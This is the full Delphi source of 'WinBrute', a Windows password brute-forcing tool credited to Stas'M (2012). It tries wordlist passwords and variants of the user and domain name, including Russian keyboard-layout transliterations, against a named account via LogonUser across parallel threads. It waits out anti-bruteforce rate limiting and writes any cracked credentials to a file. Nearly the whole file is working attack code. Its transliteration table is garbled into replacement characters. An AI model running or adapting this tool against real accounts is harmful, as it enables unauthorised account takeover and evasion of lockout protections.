program WinBrute;

{$APPTYPE CONSOLE}

uses
  SysUtils,
  Windows,
  SyncObjs,
  Classes;

type
  Thr = class(TThread)
    ShortPause: Boolean;
    slp: Cardinal;
    procedure Execute; override;
  end;

var
  Threads: Array of Thr;
  hToken: THandle;
  S: TStringList;
  cnt, cntp: Cardinal;
  ShortPause: Boolean = False;
  user, domain, goodpass: String;
  uCode: LongWord = 0;
  C: TCriticalSection;
  stop, gotit: Boolean;
  OutF: TextFile;

procedure WriteOut(S: String);
begin
  if ParamStr(4) = '' then
    Exit;
  Writeln(OutF, S);
end;

procedure Thr.Execute;
var
  pass: String;
  b: Boolean;
  ErrCode: LongWord;
  Idx, I: Integer;
begin
  inherited;
  while not Terminated do begin
    C.Enter;
    if ShortPause then begin
      C.Leave;
      ShortPause := False;
      Sleep(slp);
      slp := 0;
      C.Enter;
    end;
    if cnt >= S.Count - 1 then begin
      C.Leave;
      stop := True;
      Terminate;
      Break;
    end else begin
      Idx := InterlockedIncrement(Integer(cnt));
      pass := S.Strings[Idx];
      C.Leave;
    end;
    b := False;
    try
      if Domain <> '' then
        b := LogonUser(PWideChar(user), PWideChar(domain), PWideChar(pass), LOGON32_LOGON_NETWORK,
        LOGON32_PROVIDER_DEFAULT, hToken)
      else
        b := LogonUser(PWideChar(user), nil, PWideChar(pass), LOGON32_LOGON_NETWORK,
        LOGON32_PROVIDER_DEFAULT, hToken);
    except

    end;
    if b then begin
      CloseHandle(hToken);
      goodpass := pass;
      stop := True;
      gotit := True;
      Break;
    end else begin
      ErrCode := GetLastError;
      case ErrCode of
        50: begin // The request is not supported (Windows failure)
          C.Enter;
          Writeln('[-] Error 50 encountered, seems to be general LSASS failure');
          Writeln('[-] Obviously you need to restart your computer');
          Halt(1);
          C.Leave;
        end;
        1115: begin // Shutdown in progress
          C.Enter;
          Writeln('[-] Windows is shutting down');
          Halt(1);
          C.Leave;
        end;
        1326: ; // The user name or password is incorrect
        1328: begin // Account has time restrictions that keep it from signing in right now
          C.Enter;
          Writeln('[-] Selected user isn''t allowed to sign in right now');
          Halt(1);
          C.Leave;
        end;
        1329: begin // This user isn't allowed to sign in to this computer
          C.Enter;
          Writeln('[-] Selected user isn''t allowed to sign in to this computer');
          Halt(1);
          C.Leave;
        end;
        1327, // Blank password or sign-in time limitation
        1330, // Password expired
        1331, // Account disabled
        1793, // Account expired
        1907: // User must change password
        begin
          goodpass := pass;
          stop := True;
          gotit := True;
          uCode := ErrCode;
          Break;
        end;
        1311: begin // Logon server is down
          C.Enter;
          InterlockedExchange(Integer(cnt), Idx);
          Writeln('[-] Logon server not responding');
          for I := 0 to Length(Threads) - 1 do begin
            Threads[I].ShortPause := True;
            Threads[I].slp := 5000;
          end;
          C.Leave;
        end;
        1909: begin // Anti-bruteforce lock
          C.Enter;
          InterlockedExchange(Integer(cnt), Idx);
          Writeln('[-] Account bruteforce rate limiting detected');
          for I := 0 to Length(Threads) - 1 do begin
            Threads[I].ShortPause := True;
            Threads[I].slp := 5000;
          end;
          C.Leave;
        end;
        else begin
          C.Enter;
          Writeln('[?] Unknown error ', ErrCode);
          if Domain <> '' then
            Writeln('[?] Username: ', ParamStr(3)+'\'+ParamStr(2))
          else
            Writeln('[?] Username: ', ParamStr(2));
          Writeln('[?] Password: ', pass);
          C.Leave;
        end;
      end;
    end;
  end;
end;

function TranslitRu(S: String): String;
var
  I: Integer;
begin
  for I:=1 to Length(S) do
    case S[I] of
      'Q': S[I] := '�';
      'W': S[I] := '�';
      'E': S[I] := '�';
      'R': S[I] := '�';
      'T': S[I] := '�';
      'Y': S[I] := '�';
      'U': S[I] := '�';
      'I': S[I] := '�';
      'O': S[I] := '�';
      'P': S[I] := '�';
      '{': S[I] := '�';
      '}': S[I] := '�';
      'A': S[I] := '�';
      'S': S[I] := '�';
      'D': S[I] := '�';
      'F': S[I] := '�';
      'G': S[I] := '�';
      'H': S[I] := '�';
      'J': S[I] := '�';
      'K': S[I] := '�';
      'L': S[I] := '�';
      ':': S[I] := '�';
      '"': S[I] := '�';
      'Z': S[I] := '�';
      'X': S[I] := '�';
      'C': S[I] := '�';
      'V': S[I] := '�';
      'B': S[I] := '�';
      'N': S[I] := '�';
      'M': S[I] := '�';
      '<': S[I] := '�';
      '>': S[I] := '�';
      '?': S[I] := ',';

      'q': S[I] := '�';
      'w': S[I] := '�';
      'e': S[I] := '�';
      'r': S[I] := '�';
      't': S[I] := '�';
      'y': S[I] := '�';
      'u': S[I] := '�';
      'i': S[I] := '�';
      'o': S[I] := '�';
      'p': S[I] := '�';
      '[': S[I] := '�';
      ']': S[I] := '�';
      'a': S[I] := '�';
      's': S[I] := '�';
      'd': S[I] := '�';
      'f': S[I] := '�';
      'g': S[I] := '�';
      'h': S[I] := '�';
      'j': S[I] := '�';
      'k': S[I] := '�';
      'l': S[I] := '�';
      ';': S[I] := '�';
      '''': S[I] := '�';
      'z': S[I] := '�';
      'x': S[I] := '�';
      'c': S[I] := '�';
      'v': S[I] := '�';
      'b': S[I] := '�';
      'n': S[I] := '�';
      'm': S[I] := '�';
      ',': S[I] := '�';
      '.': S[I] := '�';
      '/': S[I] := '.';

      '|': S[I] := '\';
      '~': S[I] := '�';
      '`': S[I] := '�';
      '#': S[I] := '�';
      //
      '�': S[I] := 'Q';
      '�': S[I] := 'W';
      '�': S[I] := 'E';
      '�': S[I] := 'R';
      '�': S[I] := 'T';
      '�': S[I] := 'Y';
      '�': S[I] := 'U';
      '�': S[I] := 'I';
      '�': S[I] := 'O';
      '�': S[I] := 'P';
      '�': S[I] := '{';
      '�': S[I] := '}';
      '�': S[I] := 'A';
      '�': S[I] := 'S';
      '�': S[I] := 'D';
      '�': S[I] := 'F';
      '�': S[I] := 'G';
      '�': S[I] := 'H';
      '�': S[I] := 'J';
      '�': S[I] := 'K';
      '�': S[I] := 'L';
      '�': S[I] := ':';
      '�': S[I] := '"';
      '�': S[I] := 'Z';
      '�': S[I] := 'X';
      '�': S[I] := 'C';
      '�': S[I] := 'V';
      '�': S[I] := 'B';
      '�': S[I] := 'N';
      '�': S[I] := 'M';
      '�': S[I] := '<';
      '�': S[I] := '>';

      '�': S[I] := 'q';
      '�': S[I] := 'w';
      '�': S[I] := 'e';
      '�': S[I] := 'r';
      '�': S[I] := 't';
      '�': S[I] := 'y';
      '�': S[I] := 'u';
      '�': S[I] := 'i';
      '�': S[I] := 'o';
      '�': S[I] := 'p';
      '�': S[I] := '[';
      '�': S[I] := ']';
      '�': S[I] := 'a';
      '�': S[I] := 's';
      '�': S[I] := 'd';
      '�': S[I] := 'f';
      '�': S[I] := 'g';
      '�': S[I] := 'h';
      '�': S[I] := 'j';
      '�': S[I] := 'k';
      '�': S[I] := 'l';
      '�': S[I] := ';';
      '�': S[I] := '''';
      '�': S[I] := 'z';
      '�': S[I] := 'x';
      '�': S[I] := 'c';
      '�': S[I] := 'v';
      '�': S[I] := 'b';
      '�': S[I] := 'n';
      '�': S[I] := 'm';
      '�': S[I] := ',';
      '�': S[I] := '.';

      '\': S[I] := '|';
      '�': S[I] := '~';
      '�': S[I] := '`';
      '�': S[I] := '#';
    end;
  Result := S;
end;

var
  I: Integer;
  SI: TSystemInfo;
  cc, lcnt, pcnt: Cardinal;
  ust, unm: String;

begin
  try
    { TODO -oUser -cConsole Main : Insert code here }
    Writeln('Windows Password Brute by Stas''M');
    Writeln('Copyright (C) Stas''M Corp. 2012');
    Writeln('');
    if ParamCount < 2 then begin
      Writeln('USAGE: WinBrute.exe <wordlist> <user> [domain] [outfile]');
      Exit;
    end;
    S := TStringList.Create;
    user := ParamStr(2);
    domain := ParamStr(3);
    if ParamStr(4) <> '' then
    begin
      Assign(OutF, ParamStr(4));
      if not FileExists(ParamStr(4)) then
        Rewrite(OutF)
      else
        Append(OutF);
    end;
    S.LoadFromFile(ParamStr(1));
    S.Text := StringReplace(S.Text, '%username%', user, [rfReplaceAll]);
    S.Insert(0, '');
    S.Insert(0, user);
    S.Insert(0, user+user);
    S.Insert(0, user+user+user);
    S.Insert(0, TranslitRu(user));
    S.Insert(0, TranslitRu(user+user));
    S.Insert(0, TranslitRu(user+user+user));
    if LowerCase(user) <> user then begin
      S.Insert(0, LowerCase(user));
      S.Insert(0, LowerCase(user+user));
      S.Insert(0, LowerCase(user+user+user));
      S.Insert(0, TranslitRu(LowerCase(user)));
      S.Insert(0, TranslitRu(LowerCase(user+user)));
      S.Insert(0, TranslitRu(LowerCase(user+user+user)));
    end;
    if UpperCase(user) <> user then begin
      S.Insert(0, UpperCase(user));
      S.Insert(0, UpperCase(user+user));
      S.Insert(0, UpperCase(user+user+user));
      S.Insert(0, TranslitRu(UpperCase(user)));
      S.Insert(0, TranslitRu(UpperCase(user+user)));
      S.Insert(0, TranslitRu(UpperCase(user+user+user)));
    end;
    if domain <> '' then begin
      S.Insert(0, domain);
      S.Insert(0, domain+domain);
      S.Insert(0, domain+domain+domain);
      S.Insert(0, TranslitRu(domain));
      S.Insert(0, TranslitRu(domain+domain));
      S.Insert(0, TranslitRu(domain+domain+domain));
      if LowerCase(domain) <> domain then begin
        S.Insert(0, LowerCase(domain));
        S.Insert(0, LowerCase(domain+domain));
        S.Insert(0, LowerCase(domain+domain+domain));
        S.Insert(0, TranslitRu(LowerCase(domain)));
        S.Insert(0, TranslitRu(LowerCase(domain+domain)));
        S.Insert(0, TranslitRu(LowerCase(domain+domain+domain)));
      end;
      if UpperCase(domain) <> domain then begin
        S.Insert(0, UpperCase(domain));
        S.Insert(0, UpperCase(domain+domain));
        S.Insert(0, UpperCase(domain+domain+domain));
        S.Insert(0, TranslitRu(UpperCase(domain)));
        S.Insert(0, TranslitRu(UpperCase(domain+domain)));
        S.Insert(0, TranslitRu(UpperCase(domain+domain+domain)));
      end;
    end;
    if Length(user) > 3 then
    begin
      S.Insert(0, user[1] + user[Length(user)-1] + user[Length(user)]);
      S.Insert(0, LowerCase(user[1] + user[Length(user)-1] + user[Length(user)]));
      S.Insert(0, UpperCase(user[1] + user[Length(user)-1] + user[Length(user)]));
    end;
    pcnt := S.Count;
    GetNativeSystemInfo(SI);
    SetLength(Threads, SI.dwNumberOfProcessors);
    goodpass := '';
    stop := False;
    gotit := False;
    cnt := 0;
    cntp := 0;
    C := TCriticalSection.Create;
    for I := 0 to Length(Threads) - 1 do begin
      Threads[I] := Thr.Create(True);
      Threads[I].FreeOnTerminate := True;
      Threads[I].ShortPause := False;
      Threads[I].slp := 0;
    end;
    for I := 0 to Length(Threads) - 1 do
      Threads[I].Start;
    while not stop do begin
      Sleep(1000);
      C.Enter;
      lcnt := cnt;
      C.Leave;
      cc := lcnt - cntp;
      cntp := lcnt;
      Writeln('[*] Rate: ', cc, ' p/s (', Round(lcnt*(100/pcnt)), '%)');
    end;
    C.Free;
    S.Free;
    if gotit then begin
      ust := '';
      unm := '';
      case uCode of
        1327: begin
          Writeln('[*] Warning: Logon is restricted by policy');
          ust := 'restricted';
        end;
        1330, 1793: begin
          Writeln('[*] Warning: User account has expired');
          ust := 'expired';
        end;
        1331: begin
          Writeln('[*] Warning: User account is disabled');
          ust := 'disabled';
        end;
        1907: begin
          Writeln('[*] Warning: User must change password');
          ust := 'change';
        end;
      end;
      if Domain <> '' then
        unm := ParamStr(3) + '\' + ParamStr(2)
      else
        unm := ParamStr(2);
      Writeln('[+] Username: ', unm);
      if goodpass = '' then
      begin
        WriteOut(unm + #9 + '<empty>' + #9 + ust);
        Writeln('[+] Empty password');
      end
      else begin
        WriteOut(unm + #9 + goodpass + #9 + ust);
        Writeln('[+] Password: ', goodpass);
      end;
    end else
      Writeln('[-] Password not found');
    if ParamStr(4) <> '' then
      CloseFile(OutF);
  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.